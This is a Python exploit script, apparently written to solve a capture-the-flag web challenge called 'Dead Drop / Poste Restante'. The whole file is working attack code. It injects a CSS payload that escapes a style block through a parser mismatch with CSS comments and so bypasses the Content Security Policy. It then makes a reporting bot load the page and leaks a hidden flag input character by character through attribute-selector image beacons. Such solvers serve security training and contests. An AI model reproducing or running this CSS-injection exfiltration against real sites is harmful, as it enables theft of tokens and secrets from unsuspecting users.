#!/usr/bin/env python3
"""
Dead Drop / Poste Restante Exploit Solver
Bypasses strict CSP via CSS comment-stripping parser mismatch (/*</style>...*/)
and exfiltrates hidden flag input via same-origin /px/<id> tracking image beacons.
"""

import sys
import json
import time
import argparse
import itertools
import urllib.request
import urllib.parse
import http.cookiejar

DEFAULT_BASE = "http://k57c56d7e0a14c3000ca43f7be0e9aea9.playat.flagyard.com"

class NR(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, *a, **k):
        return None

def create_session(base_url):
    cj = http.cookiejar.CookieJar()
    op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj), NR())
    op.open(base_url.rstrip("/") + "/")
    return op

def post_drop(op, base_url, css, title="p", body="x"):
    d = urllib.parse.urlencode({"title": title, "body": body, "css": css}).encode()
    try:
        r = op.open(base_url.rstrip("/") + "/post", d, timeout=20)
        return r.status, r.headers.get("Location")
    except urllib.error.HTTPError as e:
        if e.code == 302:
            return 302, e.headers.get("Location")
        return e.code, e.read()[:200].decode("utf8", "replace")

def report_drop(op, base_url, i):
    d = urllib.parse.urlencode({"id": str(i)}).encode()
    try:
        return op.open(base_url.rstrip("/") + "/report", d, timeout=25).status
    except urllib.error.HTTPError as e:
        return e.code

def get_views(op, base_url, i):
    try:
        return json.load(op.open(f"{base_url.rstrip('/')}/post/{i}/views", timeout=15))
    except Exception:
        return []

CHARS = [chr(c) for c in range(0x20, 0x7f)]

def esc(s):
    return "".join(c if c.isalnum() and ord(c) < 128 else "\\%06x" % ord(c) for c in s)

def solve(base_url, known="BHFlagY{"):
    print(f"[*] Starting solver against {base_url}...")
    op = create_session(base_url)
    st, loc = post_drop(op, base_url, "body{color:red}", "sink")
    sink = loc.rsplit("/", 1)[-1]
    print(f"[+] Established beacon sink: {sink}", flush=True)

    rid_gen = itertools.count(1)

    def rnd(prefix):
        r = next(rid_gen)
        rules = "u{display:block;width:9px;height:9px}"
        html = ""
        items = [(f"{i}", f'[hidden][value^="{esc(prefix + c)}"]') for i, c in enumerate(CHARS)]
        items.append(("EQ", f'[hidden][value="{esc(prefix)}"]'))
        items.append(("CTRL", '[hidden]'))
        for j, (k, sel) in enumerate(items):
            rules += f'body:has({sel}) u.q{j}{{background:url(/px/{sink}?r={r}&k={k})}}'
            html += f'<u class=q{j}></u>'
        css = "body{color:red}/*</style><style>" + rules + "</style>" + html + "*/"
        st, loc = post_drop(op, base_url, css, "lk")
        if st != 302:
            return ["POSTFAIL"], str(loc)[:80]
        pid = loc.rsplit("/", 1)[-1]
        tok = f"r={r}&"
        report_drop(op, base_url, pid)
        for _ in range(20):
            time.sleep(2)
            v = get_views(op, base_url, sink)
            new = [x["beacon"] for x in v if tok in x.get("beacon", "")]
            if new:
                time.sleep(2)
                v = get_views(op, base_url, sink)
                new = [x["beacon"] for x in v if tok in x.get("beacon", "")]
                return sorted({b.split("k=")[-1] for b in new}), pid
        return [], pid

    while len(known) < 120:
        for _ in range(3):
            hits, pid = rnd(known)
            if "CTRL" in hits:
                break
            print(f"  retry post {pid} {hits}", flush=True)
        if "EQ" in hits:
            print("[+] COMPLETE:", known, flush=True)
            break
        cand = [CHARS[int(h)] for h in hits if h.isdigit()]
        if not cand:
            print(f"[-] No candidate at pos {len(known)}, hits: {hits}", flush=True)
            break
        known += cand[0]
        print(f"[{len(known)}] KNOWN: {known}", flush=True)
        if known.endswith("}"):
            print(f"\n[+] SUCCESS! FLAG: {known}", flush=True)
            break

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Dead Drop / Poste Restante Exploit Solver")
    parser.add_argument("url", nargs="?", default=DEFAULT_BASE, help=f"Target base URL (default: {DEFAULT_BASE})")
    parser.add_argument("prefix", nargs="?", default="BHFlagY{", help="Known flag prefix to resume from")
    args = parser.parse_args()
    solve(args.url, args.prefix)
